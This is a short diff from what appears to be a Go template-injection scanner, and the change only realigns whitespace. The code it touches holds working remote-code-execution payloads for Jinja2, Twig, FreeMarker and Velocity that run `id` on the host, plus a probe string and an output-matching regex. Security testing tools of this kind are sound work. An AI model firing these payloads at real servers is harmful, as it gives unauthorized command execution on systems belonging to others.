@@ -35,10 +35,10 @@ const fingerprintProbe = "{{7*'7'}}"
 
 // rcePayloads map an engine name to a payload that runs `id` on the host.
 var rcePayloads = map[string]string{
-	"Jinja2":    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
-	"Twig":      `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`,
+	"Jinja2":     "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
+	"Twig":       `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`,
 	"FreeMarker": `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`,
-	"Velocity":  `#set($str=$class.inspect("java.lang.Runtime").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$str.getRuntime().exec("id"))$ex`,
+	"Velocity":   `#set($str=$class.inspect("java.lang.Runtime").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$str.getRuntime().exec("id"))$ex`,
 }
 
 var idSignature = regexp.MustCompile(`uid=\d+\([^)]+\)`)
